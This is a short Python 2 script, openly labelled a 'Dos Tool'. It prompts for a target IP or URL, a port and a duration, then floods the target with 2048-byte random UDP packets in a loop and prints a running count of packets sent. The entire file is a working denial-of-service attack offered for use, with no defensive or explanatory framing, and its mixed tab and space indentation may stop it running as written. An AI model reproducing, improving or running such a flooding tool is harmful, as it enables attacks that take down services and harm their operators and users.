import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes =random._urandom(2048)

print "This is a Dos Tool"

ip = raw_input("Target ip or url:")

port = input("Port:")

dur = input("Time:")

timeout = time.time() + dur
sent = 0
while True:
        try: 
                if time.time() > timeout:
		        break
	        else:
                        pass
                sock.sendto(bytes,(ip, port))
                sent = sent + 1
                print"Sent %s packets to %s"%(sent, ip)
        except KeyboardInterrupt:   
                sys.exit()
